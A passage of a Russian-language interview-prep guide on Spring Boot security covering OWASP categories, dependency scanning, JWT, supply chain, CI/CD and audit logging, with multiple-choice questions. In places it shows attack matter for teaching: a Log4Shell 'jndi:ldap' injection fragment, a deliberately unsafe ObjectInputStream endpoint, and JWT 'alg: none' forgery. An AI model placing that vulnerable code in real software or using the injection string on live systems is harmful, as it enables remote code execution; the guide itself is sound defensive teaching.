> - [ ] Достаточно установить только Strict-Transport-Security (HSTS); остальные headers (CSP, X-Frame-Options) избыточны при правильно настроенном TLS. | HSTS защищает от downgrade к HTTP, но не от XSS, clickjacking и MIME-sniffing. Это разные уровни защиты: HSTS работает на транспорте, CSP — на контенте. Отсутствие CSP и X-Frame-Options оставляет приложение уязвимым независимо от TLS.

## Q20. Как разделить конфигурацию между dev и prod?

Ключевой принцип: **prod-конфигурация должна быть secure by default**, dev-расширения включаются явно:

```yaml
# application.yml — общие настройки (безопасные по умолчанию)
spring:
  jpa:
    open-in-view: false
    show-sql: false

management:
  endpoints:
    web:
      exposure:
        include: health,info

---
# application-dev.yml — только для разработки
spring:
  config:
    activate:
      on-profile: dev
  h2:
    console:
      enabled: true
  jpa:
    show-sql: true

management:
  endpoints:
    web:
      exposure:
        include: "*"  # допустимо только в dev

---
# application-prod.yml
spring:
  config:
    activate:
      on-profile: prod
  datasource:
    url: ${DATABASE_URL}  # из переменных окружения
    username: ${DB_USER}
    password: ${DB_PASSWORD}

server:
  error:
    include-stacktrace: never
    include-message: never
```

> Секреты **никогда** не должны быть в `application.yml` — только из env-переменных, `Vault` или `Secret Manager` (см. Q37).

> [!mcq]
> - [ ] Dev и prod конфигурации различаются только URL базы данных; все остальные настройки (actuator exposure, show-sql, H2 console) должны быть одинаковыми для воспроизводимости бага. | Это противоречит secure by default. Dev-расширения (H2 console, actuator *, show-sql, debug-логи) должны быть ВЫКЛЮЧЕНЫ в prod. Одинаковая конфигурация создаст дыры безопасности в prod. Воспроизведение багов достигается через staging-профиль с prod-like конфигом.
> - [x] Prod-конфигурация должна быть secure by default, dev-расширения (H2 console, actuator *, show-sql, include-stacktrace) включаются явно в application-dev.yml через spring.config.activate.on-profile=dev; секреты — из env-переменных/Vault, не из yml. | Верный подход. Общий application.yml содержит безопасные значения, профильные override-файлы (application-dev/prod.yml) добавляют специфику. Секреты через ${DATABASE_URL}, ${DB_PASSWORD} берутся из env или Vault, не из git.
> - [ ] Секреты (пароли БД, API-ключи) должны храниться в application.yml с префиксом dev-/prod-; это упрощает deploy и eliminates необходимость в Vault. | Секреты НИКОГДА не должны быть в application.yml (даже в зашифрованном виде): yml попадает в git и Docker-образы. Правильный подход — env-переменные (${DB_PASSWORD}), Vault или Cloud Secret Manager. Префиксы не спасают от утечки через git history.
> - [ ] Разделение dev/prod выполняется через условную компиляцию с @ConditionalOnProperty: один application.yml с if-else логикой для каждого окружения. | Spring Boot не использует условную компиляцию. Разделение работает через профили (Spring Profiles) и файлы application-{profile}.yml. @ConditionalOnProperty применяется на бинах, а не на yml-конфиге.

---

## Q21. (!) Как выявлять и управлять уязвимыми зависимостями?

`Vulnerable and Outdated Components` (`A06:2021`) — использование библиотек с известными `CVE`. Проблема часто **транзитивная**: уязвимость в зависимости зависимости.

**Инструменты для Java/Gradle:**

```groovy
// build.gradle — OWASP Dependency-Check
plugins {
    id 'org.owasp.dependencycheck' version '9.0.9'
}

dependencyCheck {
    failBuildOnCVSS = 7.0f  // fail на High и Critical
    formats = ['HTML', 'JSON']
    suppressionFile = 'owasp-suppressions.xml'  // false positives
}
```

```groovy
// Gradle — отображение дерева зависимостей для анализа
// ./gradlew dependencies --configuration runtimeClasspath
```

**Процесс управления:**

```mermaid
graph LR
    A[SCA scan<br/>в CI/CD] --> B{CVE найдены?}
    B -->|Нет| C[Деплой]
    B -->|Да| D{Severity}
    D -->|Critical/High| E[Block release<br/>Исправить немедленно]
    D -->|Medium| F[Создать задачу<br/>SLA: 30 дней]
    D -->|Low| G[Backlog]
    E --> H[Обновить зависимость]
    H --> I[Регрессионные тесты]
    I --> A
```

> [!mcq]
> - [ ] `Vulnerable Components` выявляется только ручным анализом `build.gradle` перед релизом; SCA не видит транзитивные зависимости. | OWASP `Dependency-Check` идёт по дереву `runtimeClasspath` целиком. ❌ ПОСЛЕДСТВИЕ: ручной аудит пропускает `org.apache.logging.log4j:log4j-core` как транзитивную; `Log4Shell` (`CVE-2021-44228`) живёт в проде месяцами — миллионы систем компрометированы.
> - [x] `Vulnerable and Outdated Components` (`A06:2021`) выявляется SCA: `OWASP Dependency-Check`, `Snyk`, `Trivy` — сканируют транзитивные зависимости на CVE; интеграция в CI с блоком MR на CVSS≥7.0; `suppression.xml` для обоснованных false positives. | Стандарт component risk-management. ✓ ПРИМЕНЯТЬ: `./gradlew dependencyCheckAnalyze` + `failBuildOnCVSS=7.0f` в Spring Boot pipelines (Netflix, Spotify). 📋 ПРАВИЛО: «SCA в CI блокирует CVSS≥7.0». 🔗 См. Q22, Q23, Q27.
> - [ ] `Vulnerable Components` — проблема только npm; Maven Central + GPG защищают Java. | Java регулярно страдает: `Log4Shell` 2021, `Spring4Shell` 2022, `Jackson` polymorphic deserialization (CVE-2017-7525, CVE-2019-12384). GPG гарантирует авторство, не отсутствие CVE. ❌ ПОСЛЕДСТВИЕ: команда не настраивает SCA «потому что Java безопасна», `Log4Shell` сидит в `spring-boot-starter` через transitive — RCE через `User-Agent: ${jndi:ldap://...}`.
> - [ ] `Vulnerable Components` решается auto-update до latest через Dependabot без тестов: latest всегда безопасен. | Auto-update ломает совместимость и тащит ещё не исправленные CVE (regression). ❌ ПОСЛЕДСТВИЕ: blind update `spring-boot 3.0 → 3.2` без тестов ломает `WebSecurityConfigurerAdapter` (deprecated), prod падает; правильно — Dependabot создаёт MR, CI прогоняет тесты, ревью перед merge.

## Q22. Что такое SBOM и зачем он нужен?

`SBOM` (`Software Bill of Materials`) — полный перечень всех компонентов, включённых в приложение, с версиями и лицензиями. Аналог списка ингредиентов на упаковке продукта.

**Генерация SBOM в формате CycloneDX:**
```groovy
// build.gradle
plugins {
    id 'org.cyclonedx.bom' version '1.8.2'
}

cyclonedxBom {
    includeConfigs = ['runtimeClasspath']
    outputFormat = 'json'
    schemaVersion = '1.5'
}
// ./gradlew cyclonedxBom → build/reports/bom.json
```

Зачем нужен SBOM:
- **Быстрая реакция на CVE** — при появлении уязвимости в `Log4j` можно за секунды проверить, используется ли она
- **Compliance** — многие регуляторы (FDA, CISA) требуют SBOM
- **Лицензионный аудит** — выявление несовместимых лицензий
- **Supply chain transparency** — понимание, что именно входит в артефакт

> [!mcq]
> - [ ] SBOM — это отчёт SAST-сканирования, показывающий уязвимости в коде приложения; генерируется SonarQube после статического анализа. | Это путает SBOM с отчётом SAST. SBOM (Software Bill of Materials) — перечень всех компонентов с версиями, как список ингредиентов. SAST-отчёт — найденные уязвимости в собственном коде. SBOM генерируется через CycloneDX/SPDX, а не SonarQube.
> - [x] SBOM (Software Bill of Materials) — машиночитаемый список всех компонентов артефакта (зависимости, версии, лицензии); стандарты: CycloneDX, SPDX; нужен для быстрой реакции на CVE (Log4Shell), compliance (FDA/CISA), лицензионного аудита. | Верное определение. Аналог — список ингредиентов на упаковке продукта. При появлении CVE (например, Log4j) SBOM позволяет за секунды найти все приложения с уязвимой зависимостью. В Gradle: cyclonedxBom plugin генерирует JSON/XML.
> - [ ] SBOM — это внутренний документ security-команды; разработчики не должны иметь доступ к SBOM, так как он содержит чувствительную информацию о версиях библиотек. | SBOM — публичный артефакт (часто распространяется вместе с релизом). Версии библиотек не являются секретом — они и так легко определяются из open source кода. Современные стандарты (CISA, EU Cyber Resilience Act) требуют публикации SBOM для пользователей.
> - [ ] SBOM генерируется вручную перед каждым релизом через grep по pom.xml или build.gradle; автоматизация невозможна из-за сложности транзитивных зависимостей. | SBOM автоматизирован в сборке через плагины. В Gradle: org.cyclonedx.bom plugin, ./gradlew cyclonedxBom → build/reports/bom.json. Инструмент обходит всё дерево зависимостей (включая транзитивные) и генерирует полный SBOM в CycloneDX/SPDX формате.

## Q23. Как организовать SCA в CI/CD pipeline?

`SCA` (`Software Composition Analysis`) — автоматическая проверка зависимостей на уязвимости:

```yaml
# GitLab CI пример
dependency-check:
  stage: security
  script:
    - ./gradlew dependencyCheckAnalyze
  artifacts:
    paths:
      - build/reports/dependency-check-report.html
  allow_failure: false  # блокирует MR при критичных CVE

# Дополнительно — Trivy для контейнеров
container-scan:
  stage: security
  script:
    - trivy image --severity HIGH,CRITICAL --exit-code 1 $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
```

Ключевые практики:
- **Сканирование при каждом MR** — раннее обнаружение
- **Подавление false positives** — файл `owasp-suppressions.xml` с обоснованием
- **Мониторинг runtime** — новые CVE могут появиться после деплоя
- **Renovate/Dependabot** — автоматические MR на обновление зависимостей

> [!mcq]
> - [x] SCA интегрируется в CI/CD с блокировкой MR при критичных CVE (allow_failure: false), подавлением false positives через owasp-suppressions.xml с обоснованием, дополнением Trivy для container scanning и Renovate/Dependabot для автообновлений. | Верная стратегия. Ключевой принцип — shift-left: находить уязвимости при MR, а не в production. Suppression-файл — не замалчивание, а документирование обоснованных исключений. Trivy сканирует Docker-слои, которые не покрывает OWASP Dependency-Check.
> - [ ] SCA запускается только раз в квартал как ручной security-аудит; интеграция в CI/CD избыточна, так как новые CVE появляются редко. | Новые CVE публикуются ежедневно. Квартальный ручной аудит оставляет окно атаки в 3 месяца — за это время Log4Shell (2021) заразил миллионы систем. Автоматизация в CI с shift-left необходима для своевременного обнаружения.
> - [ ] SCA должен запускаться только на prod-ветках; на feature-branches сканирование избыточно, так как код ещё не попадает в production. | Это откладывает обнаружение на последний момент. Принцип shift-left: находить проблемы как можно раньше (на MR). Обнаружение CVE перед merge позволяет исправить без экстренного hotfix. Сканирование на feature-branches — best practice.
> - [ ] SCA полностью заменяет pentest и DAST в CI/CD; если SCA пройден, приложение считается безопасным для production-релиза. | SCA покрывает только component vulnerabilities (A06), но не SQL Injection, XSS, Broken Access Control, SSRF и другие категории. Полная security-стратегия: SAST (код), SCA (зависимости), Secret Scan, IaC Scan, Container Scan, DAST (runtime). Каждый инструмент покрывает свою категорию.

---

## Q24. (!) Какие ошибки аутентификации наиболее опасны?

`Identification and Authentication Failures` (`A07:2021`) — ошибки, дающие злоумышленнику доступ под чужой учётной записью:

1. **Слабая политика паролей** — минимум 8 символов недостаточен, нужна проверка по словарям утечек
2. **Отсутствие `MFA`** — для критичных систем `MFA` обязателен
3. **Уязвимый password recovery** — предсказуемые токены, отсутствие rate limiting
4. **`Session fixation`** — сессия не пересоздаётся после логина
5. **Длинноживущие токены** — `JWT` без expiration или с expiration в неделю
6. **Отсутствие lockout** — неограниченные попытки ввода пароля
7. **Утечка информации** — «пользователь не найден» vs «неверный пароль» (подсказка атакующему)

```java
// ПЛОХО: раскрывает существование пользователя
if (user == null) throw new AuthException("User not found");
if (!matches(password)) throw new AuthException("Wrong password");

// ХОРОШО: единообразный ответ
if (user == null || !passwordEncoder.matches(password, user.getPassword())) {
    throw new BadCredentialsException("Invalid credentials");
}
```

Подробнее о паттернах аутентификации — в [вопросах по аутентификации](authentication-authorization-patterns-interview.md), о `OAuth2` — в [вопросах по OAuth2](oauth2-interview.md).

> [!mcq]
> - [ ] `A07 Identification and Authentication Failures` — только ошибки OAuth2/OIDC; классическая форм-аутентификация не входит. | A07 покрывает ВСЕ типы auth: формы, OAuth2, JWT, SAML, Basic. ❌ ПОСЛЕДСТВИЕ: `Mirai botnet 2016` — 600K устройств скомпрометированы через default credentials `admin/admin` (классическая форм-аутентификация); один из крупнейших DDoS в истории (Dyn, Krebs).
> - [x] A07: отсутствие MFA для критичных систем, уязвимый password recovery (предсказуемые токены, нет rate limit), session fixation, длинноживущие JWT без exp, info leak через разные сообщения (`user not found` vs `wrong password`). | Разные сообщения позволяют enumeration. ✓ ПРИМЕНЯТЬ: GitHub требует MFA для всех contributors; Spring Security возвращает `BadCredentialsException` единообразно через `UserDetailsService`. 📋 ПРАВИЛО: «Один error message + constant-time compare». 🔗 См. Q9, Q25, Q26.
> - [ ] Основная защита аутентификации — `CAPTCHA` на форме логина; больше ничего не нужно. | CAPTCHA обходится CAPTCHA-solving сервисами ($1 за 1000) и не помогает против credential stuffing с утёкшими парами. ❌ ПОСЛЕДСТВИЕ: `Disney+ 2019` — 5K аккаунтов скомпрометированы за неделю запуска через credential stuffing; CAPTCHA не остановила, нужен MFA + HIBP-проверка.
> - [ ] Длинноживущие токены безопаснее коротких: меньше запросов к auth-серверу. | Длинный exp = большое окно атаки при компрометации. ❌ ПОСЛЕДСТВИЕ: украденный JWT с `exp=7d` даёт неделю доступа без возможности отзыва (JWT stateless); стандарт — `access=15m + refresh=7d` с rotation; `Slack 2015` урок — длинные tokens увеличили blast radius.

## Q25. Как защититься от brute force и credential stuffing?

**Rate limiting + progressive delay + account lockout:**

```java
@Service
@RequiredArgsConstructor
public class LoginProtectionService {

    private final Cache<String, LoginAttempts> attemptsCache;

    public void checkAndRecord(String username, String clientIp, boolean success) {
        String key = username + ":" + clientIp;
        LoginAttempts attempts = attemptsCache.get(key, k -> new LoginAttempts());

        if (attempts.isLocked()) {
            throw new AccountLockedException(
                "Account locked. Try again in " + attempts.getLockRemainingMinutes() + " min");
        }

        if (success) {
            attemptsCache.invalidate(key);
        } else {
            attempts.increment();
            // Progressive lockout: 5 попыток → блок 1 мин, 10 → 5 мин, 15 → 30 мин
            if (attempts.getCount() >= 15) {
                attempts.lockFor(Duration.ofMinutes(30));
            } else if (attempts.getCount() >= 10) {
                attempts.lockFor(Duration.ofMinutes(5));
            } else if (attempts.getCount() >= 5) {
                attempts.lockFor(Duration.ofMinutes(1));
            }
        }
    }
}
```

**Credential stuffing** — атака с использованием утёкших пар логин/пароль из других сервисов. Дополнительные меры:
- Проверка паролей по базе утечек (`HaveIBeenPwned` API)
- `CAPTCHA` после N неудачных попыток
- Детекция аномалий: новый IP, необычный User-Agent, массовые запросы

> [!mcq]
> - [ ] Защита от brute force — хранение паролей в `BCrypt`; медленный хэш делает brute force невозможным. | `BCrypt` защищает offline (украли БД), но не online (POST `/login` с разными паролями). ❌ ПОСЛЕДСТВИЕ: `Slack 2015` — 500K аккаунтов под brute force через API без rate-limit; `BCrypt` в БД не помог, online-перебор шёл со скоростью сети.
> - [ ] Защита от brute force — постоянная блокировка после 3 попыток. | Permanent lock — DoS-вектор: атакующий блокирует любого пользователя 3 неверными попытками. ❌ ПОСЛЕДСТВИЕ: massive lockout-DoS на e-commerce в Black Friday — атакующие блокируют top-100K customers, support tickets вырастают в 100×, бизнес теряет конверсию.
> - [ ] Credential stuffing предотвращается только MFA; HIBP/CAPTCHA/rate-limit не эффективны. | MFA мощно, но не единственный слой. HIBP отсекает утёкшие пароли при регистрации/смене. ❌ ПОСЛЕДСТВИЕ: команда полагается только на MFA; новый пользователь регистрируется с паролем `123456` (в HIBP уже миллионы), MFA отключают «временно для UX» — credential stuffing проходит.
> - [x] Brute force — progressive lockout (5→1 мин, 10→5 мин, 15→30 мин) + rate-limit по IP/username; credential stuffing — HIBP API при регистрации/смене + CAPTCHA + детекция аномалий + MFA. | ✓ ПРИМЕНЯТЬ: Cloudflare Bot Management + HaveIBeenPwned API в Spring Security `CompromisedPasswordChecker` (Spring Security 6.3+). 📋 ПРАВИЛО: «Progressive lockout + HIBP + MFA — три слоя». 🔗 См. Q9, Q24, Q26.

## Q26. Как безопасно управлять JWT-токенами?

`JWT` — распространённый механизм stateless-аутентификации, но с типичными ошибками:

| Ошибка | Последствие | Правильный подход |
|--------|------------|-------------------|
| `alg: none` | Токен без подписи принимается | Явно указывать допустимые алгоритмы |
| Хранение секретов в payload | Утечка данных | Минимум данных: `sub`, `roles`, `exp` |
| Длинный `exp` (дни/недели) | Невозможно отозвать | Access token: 15 мин, refresh: 7 дней |
| Секрет-подпись `"secret"` | Подделка токенов | RSA/EC ключи, минимум 256 бит |
| Нет `aud`/`iss` validation | Token confusion | Всегда проверять `audience` и `issuer` |

```java
// Безопасная конфигурация JWT в Spring Security
@Bean
public JwtDecoder jwtDecoder() {
    NimbusJwtDecoder decoder = NimbusJwtDecoder
            .withPublicKey(rsaPublicKey)
            .build();

    // Валидация claims
    OAuth2TokenValidator<Jwt> validators = new DelegatingOAuth2TokenValidator<>(
        JwtValidators.createDefaultWithIssuer("https://auth.example.com"),
        new JwtClaimValidator<List<String>>("aud", 
            aud -> aud.contains("my-api")),
        new JwtTimestampValidator(Duration.ofSeconds(30)) // clock skew
    );
    decoder.setJwtValidator(validators);
    return decoder;
}
```

> [!mcq]
> - [ ] JWT безопасно подписывать алгоритмом "none" — это упрощает reуверификацию в distributed-системах, так как не требует распространения секретного ключа. | Алгоритм "none" — это критическая уязвимость: токен без подписи принимается как валидный. Злоумышленник меняет header на {"alg":"none"} и modifies payload без необходимости знать секрет. Библиотека должна явно запрещать "none" через whitelist разрешённых алгоритмов.
> - [x] Безопасный JWT: access token с exp=15 мин, refresh token=7 дней с rotation; подпись через RSA/EC (асимметричная) или HS256 с ключом ≥256 бит; валидация aud/iss; явный whitelist алгоритмов без "none"; минимум данных в payload (sub, roles, exp). | Верные практики. RS256/ES256 предпочтительнее HS256 для multi-service: приватный ключ у auth-сервера, публичный у resource-серверов. Валидация aud/iss предотвращает token confusion (токен от service A принимается service B).
> - [ ] JWT payload может безопасно содержать любые данные (пароль, номер карты), так как JWT подписан и защищён от изменения. | Подпись защищает от ИЗМЕНЕНИЯ, но не от ЧТЕНИЯ. JWT по умолчанию не шифрует payload — это base64-encoded JSON, который любой может прочитать. Чувствительные данные (пароли, CVV, PII) нельзя помещать в JWT. Минимум данных: sub, roles, exp, aud, iss.
> - [ ] JWT с долгим exp (30 дней) безопаснее коротких (15 мин): меньше запросов к auth-серверу, нет риска утечки при обновлении, нет сложности с refresh-токенами. | Долгий exp в JWT катастрофичен: JWT — stateless, его нельзя отозвать до истечения. Украденный токен на 30 дней = 30 дней доступа атакующего. Короткий access token + refresh token — стандарт. Для отзыва — token revocation list или короткое TTL.

---

## Q27. (!) Что такое supply-chain атаки и как от них защищаться?

`Software and Data Integrity Failures` (`A08:2021`) — **новая категория**, покрывающая атаки на цепочку поставки ПО:

```mermaid
graph LR
    A[Атакующий] --> B[Компрометация<br/>npm/Maven пакета]
    A --> C[Компрометация<br/>CI/CD pipeline]
    A --> D[Подмена<br/>Docker-образа]
    A --> E[Dependency<br/>confusion]
    
    B --> F[Вредоносный код<br/>в продакшене]
    C --> F
    D --> F
    E --> F
```

**Реальные примеры:**
- **`SolarWinds`** (2020) — компрометация build-системы, вредоносный код в обновлении
- **`Log4Shell`** (2021) — уязвимость в повсеместно используемой библиотеке
- **`Codecov`** (2021) — подмена bash-скрипта в CI/CD
- **`Dependency confusion`** — публичный пакет с именем внутреннего, npm/Maven берёт публичный

**Защита:**
- **Подпись артефактов** — GPG-подпись JAR-файлов, `Sigstore`/`cosign` для контейнеров
- **Проверка checksums** — `gradle --verify-metadata` с `verification-metadata.xml`
- **Private registry** — Nexus/Artifactory как proxy с контролем
- **Pinning версий** — точные версии вместо диапазонов (`1.2.3`, не `1.+`)
- **SBOM** — полный учёт всех компонентов (см. Q22)

> [!mcq]
> - [ ] Supply-chain атаки касаются только malicious npm-пакетов; Java/Maven защищены `Maven Central`. | Java уязвим: `Log4Shell` 2021, `Spring4Shell` 2022, typosquatting `org.apache.commons` похожих имён. ❌ ПОСЛЕДСТВИЕ: команда не настраивает SCA «потому что Java», `event-stream`-style backdoor через transitive `commons-fileupload` остаётся незамеченным месяцами.
> - [ ] Supply-chain защищается только open source зависимостями: код audited сообществом. | `Log4j` был open source 8 лет до обнаружения JNDI-lookup; `event-stream` (npm 2018) — open source с внедрённым backdoor для bitcoin-кошельков. ❌ ПОСЛЕДСТВИЕ: «open source = secure» — мантра, ведущая к отсутствию SCA/SBOM; `Log4Shell` сидит в проде до публикации CVE.
> - [ ] Pinning версий (`1.2.3` вместо `1.+`) увеличивает риск, так как нет авто-security-обновлений. | Pinning — основа воспроизводимости и защиты от подмены. Security-обновления через Dependabot+тесты. ❌ ПОСЛЕДСТВИЕ: диапазон `1.+` подтянул `event-stream@3.3.6` с backdoor, build падает в проде; pinning + Dependabot закрыл бы атаку через явный MR.
> - [x] Supply-chain атаки (`A08:2021`) — компрометация build/deps/CI (`SolarWinds 2020`, `Log4Shell 2021`, `Codecov 2021`, dependency confusion); защита — подпись артефактов (`Sigstore`/`cosign`), checksums (`gradle verification-metadata.xml`), private registry, pinning, SBOM. | ✓ ПРИМЕНЯТЬ: Google использует `Sigstore` для подписи всех контейнеров; Kubernetes ecosystem требует cosign-verified образы. 📋 ПРАВИЛО: «Pin + sign + verify в каждом deploy». 🔗 См. Q21, Q22, Q29.

## Q28. Чем опасна небезопасная десериализация в Java?

Небезопасная десериализация позволяет выполнить **произвольный код** на сервере через специально сконструированный объект:

**Уязвимый код:**
```java
// ОПАСНО: десериализация произвольного объекта из HTTP-запроса
@PostMapping("/api/import")
public void importData(@RequestBody byte[] data) {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    Object obj = ois.readObject(); // RCE через gadget chain!
    processData(obj);
}
```

**Защита:**

1. **Не использовать Java serialization** для внешних данных — использовать `JSON` (`Jackson`) или `Protobuf`
2. Если нужна Java serialization — **whitelist классов**:

```java
// ObjectInputFilter (Java 9+)
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;!*"  // только свои DTO, всё остальное — reject
));
```

3. **Jackson** тоже требует осторожности:
```java
ObjectMapper mapper = new ObjectMapper();
// ОПАСНО: включает полиморфную десериализацию
// mapper.enableDefaultTyping(); // НИКОГДА не делать

// Безопасно: явная аннотация только где нужно
@JsonTypeInfo(use = Id.NAME, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = CreditCard.class, name = "credit"),
    @JsonSubTypes.Type(value = BankTransfer.class, name = "bank")
})
public abstract class PaymentMethod { }
```

> [!mcq]
> - [ ] Небезопасная десериализация в Java — только утечка данных из payload; RCE возможен только в Python (`pickle`). | Java serialization — главный вектор RCE. ❌ ПОСЛЕДСТВИЕ: `Apache Commons Collections` gadget chain (ysoserial) — RCE через `InvokerTransformer` при `readObject()`; Jenkins, WebLogic, JBoss получали unauth RCE начиная с 2015 (FoxGlove Security raised the issue).
> - [x] Небезопасная десериализация в Java — RCE через gadget chains (ysoserial: `CommonsCollections`, Spring, Hibernate) при `ObjectInputStream.readObject()`; защита — JSON/Protobuf для external data, `ObjectInputFilter` whitelist, не включать `enableDefaultTyping` в Jackson. | Jackson `enableDefaultTyping` = `Object`-поля десериализуются в произвольный класс. ✓ ПРИМЕНЯТЬ: `@JsonTypeInfo(use = Id.NAME)` + `@JsonSubTypes` whitelist в Spring Boot REST контроллерах (стандарт). 📋 ПРАВИЛО: «Whitelist полиморфных типов, не enableDefaultTyping». 🔗 См. Q21, Q27, Q44.
> - [ ] Jackson безопасен при любой конфигурации, так как JSON — текстовый формат; gadget chains работают только с бинарным `ObjectInputStream`. | Jackson уязвим при `enableDefaultTyping()` или полиморфных классах без whitelist. ❌ ПОСЛЕДСТВИЕ: `CVE-2017-7525`, `CVE-2019-12384` — RCE через Jackson polymorphic deserialization без `@JsonTypeInfo`-whitelist; десятки CVE в blacklist Jackson по той же причине.
> - [ ] Решение — использовать `Serializable`-интерфейс для всех DTO; `ObjectInputStream` отклоняет опасные классы. | `Serializable` — маркерный интерфейс без security-проверки. Gadget chains используют именно legitimate `Serializable` классы из библиотек. ❌ ПОСЛЕДСТВИЕ: команда «защищается» Serializable-маркером, но `CommonsCollections` все Serializable — uploads endpoint десериализует attacker payload → RCE.

## Q29. Как защитить CI/CD pipeline от компрометации?

CI/CD pipeline — привилегированная среда с доступом к секретам и деплою. Защита:

```yaml
# GitLab CI — принципы безопасного pipeline
stages:
  - build
  - security
  - test
  - deploy

build:
  stage: build
  script:
    - ./gradlew build -x test
  # Принцип: минимальные права у CI runner
  tags: [restricted-runner]

verify-signatures:
  stage: security
  script:
    # Проверка подписей зависимостей
    - ./gradlew --write-verification-metadata sha256
    - git diff --exit-code gradle/verification-metadata.xml

security-scan:
  stage: security
  script:
    - ./gradlew dependencyCheckAnalyze
    - trivy image --exit-code 1 $IMAGE
  # Разделение: security-сканирование — отдельный stage с отдельными правами
```

Ключевые практики:
- **Изоляция секретов** — CI-переменные доступны только нужным стадиям
- **Immutable runners** — runner пересоздаётся после каждой задачи
- **Protected branches** — деплой только с `main`, merge requires approval
- **Аудит изменений** — все изменения в `.gitlab-ci.yml` требуют ревью
- **Минимальные права** — deploy token имеет только `push` к registry

> [!mcq]
> - [x] Защита CI/CD: immutable runners (пересоздание после каждой задачи), изоляция секретов по стадиям, protected branches с approval, минимальные права deploy-токенов (только push в registry), подписи зависимостей и образов (cosign/Sigstore). | Верная стратегия. Изоляция секретов предотвращает утечку через PR-сборки. Immutable runners предотвращают persistence атакующего. Approval на protected branch — гарантия ревью критичных изменений. Cosign подписывает Docker-образы для проверки аутентичности при деплое.
> - [ ] CI/CD pipeline защищается только network isolation runner'а от internet; все остальные меры (подписи, минимальные права, immutable runners) избыточны. | Network isolation — лишь один слой. Атака может произойти через compromised dependency (SolarWinds build-system), malicious PR, stolen CI-secrets. Defense in depth требует всех слоёв: подписи, минимальные права, immutable runners, approval на protected branches.
> - [ ] CI-runner должен иметь root-доступ и полные права в cloud-аккаунте для гибкости деплоя; ограничение прав усложняет pipeline и ломает автоматизацию. | Root + полные права = catastrophic blast radius при компрометации. Best practice — минимальные права: отдельные service accounts для build/test/deploy, OIDC federation вместо долгоживущих credentials. Гибкость достигается правильной архитектурой, а не привилегиями.
> - [ ] Секреты в CI/CD должны быть доступны всем стадиям pipeline для упрощения переиспользования; ограничение на уровне стадий создаёт проблемы отладки. | Изоляция секретов по стадиям — обязательная мера. Build-стадия не должна иметь access к deploy-credentials. Security-scan не нужен API-ключ к production. GitLab CI позволяет ограничивать переменные по environment и protected branches. Минимизация blast radius.

---

## Q30. (!) Что должна включать стратегия security-логирования?

`Security Logging and Monitoring Failures` (`A09:2021`) — если атака не записана и не алертится, инцидент обнаруживается слишком поздно. Средний TTD (Time to Detect) breach — **287 дней** (IBM Cost of Data Breach Report).

**Три компонента стратегии:**

```mermaid
graph TD
    A[Security Logging] --> B[Что логировать]
    A --> C[Как логировать]
    A --> D[Как реагировать]
    
    B --> B1[Auth events]
    B --> B2[Access denied]
    B --> B3[Input validation failures]
    B --> B4[Sensitive operations]
    
    C --> C1[Structured JSON logs]
    C --> C2[Correlation ID]
    C --> C3[Tamper-proof storage]
    C --> C4[Retention policy]
    
    D --> D1[Real-time alerts]
    D --> D2[SIEM correlation]
    D --> D3[Incident runbooks]
    D --> D4[On-call process]
```

**Критическое правило**: логирование без процесса реагирования почти бесполезно. Нужны алерты, runbooks и on-call.

> [!mcq]
> - [ ] `A09 Logging Failures` — только retention: логи 1 год, и всё. | Retention — лишь часть. ❌ ПОСЛЕДСТВИЕ: `Equifax 2017` — логи были, но без алертинга и SIEM-correlation; атака длилась 76 дней до обнаружения, 147M записей утекло; средний TTD breach 287 дней (IBM 2023).
> - [x] Стратегия security-логирования: что логировать (auth events, access denied, sensitive ops), как (structured JSON, correlation ID, tamper-proof storage, retention), как реагировать (real-time alerts, SIEM, runbooks, on-call). | ✓ ПРИМЕНЯТЬ: Netflix использует `Atlas` + `Mantis` для real-time security analytics; Spring Boot — `Logback JSON encoder` + Elastic + Alertmanager. 📋 ПРАВИЛО: «Логи без алертов = forensics, не defense». 🔗 См. Q31, Q32, Q33.
> - [ ] Security-логирование = `logging.level.org.springframework.security=DEBUG`. | DEBUG полезен для отладки, не для audit: нет structured format, нет correlation ID, раскрывает внутреннюю структуру в проде. ❌ ПОСЛЕДСТВИЕ: DEBUG в проде логирует JWT целиком и пароли пользователей при ошибках Authentication → секреты в Kibana, доступ через лог-агрегатор.
> - [ ] Логировать всё: full request/response body, все headers — больше данных лучше. | Избыточное логирование = утечка PII/паролей/токенов через логи (GDPR fine). ❌ ПОСЛЕДСТВИЕ: `Twitter 2018` — пароли в plaintext в internal logs (330M пользователей задеты); полные `Authorization: Bearer ...` headers в ELK → читают все, у кого доступ к Kibana.

## Q31. Какие события безопасности обязательно логировать?

**Обязательные security-события:**

```java
@Aspect
@Component
public class SecurityAuditAspect {

    private static final Logger auditLog = LoggerFactory.getLogger("SECURITY_AUDIT");

    // 1. Все попытки аутентификации (успешные и неуспешные)
    @AfterReturning("execution(* *.authenticate(..))")
    public void logSuccessfulAuth(JoinPoint jp) {
        auditLog.info("AUTH_SUCCESS user={} ip={} ua={}",
            getUsername(), getClientIp(), getUserAgent());
    }

    @AfterThrowing(pointcut = "execution(* *.authenticate(..))", throwing = "ex")
    public void logFailedAuth(JoinPoint jp, Exception ex) {
        auditLog.warn("AUTH_FAILURE user={} ip={} reason={}",
            getAttemptedUsername(jp), getClientIp(), ex.getMessage());
    }

    // 2. Отказы авторизации
    @AfterThrowing(pointcut = "@annotation(PreAuthorize)", throwing = "ex")
    public void logAccessDenied(JoinPoint jp, AccessDeniedException ex) {
        auditLog.warn("ACCESS_DENIED user={} resource={} method={}",
            getUsername(), getResource(jp), jp.getSignature().getName());
    }

    // 3. Чувствительные операции
    @Around("@annotation(AuditSensitive)")
    public Object logSensitiveOp(ProceedingJoinPoint jp) throws Throwable {
        auditLog.info("SENSITIVE_OP_START user={} operation={} params={}",
            getUsername(), jp.getSignature().getName(), sanitize(jp.getArgs()));
        try {
            Object result = jp.proceed();
            auditLog.info("SENSITIVE_OP_SUCCESS user={} operation={}",
                getUsername(), jp.getSignature().getName());
            return result;
        } catch (Exception e) {
            auditLog.error("SENSITIVE_OP_FAILURE user={} operation={} error={}",
                getUsername(), jp.getSignature().getName(), e.getMessage());
            throw e;
        }
    }
}
```

**Чего НЕ логировать:**
- Пароли, токены, секреты (даже замаскированные)
- PII без необходимости (GDPR)
- Полное тело запроса с чувствительными данными

> [!mcq]
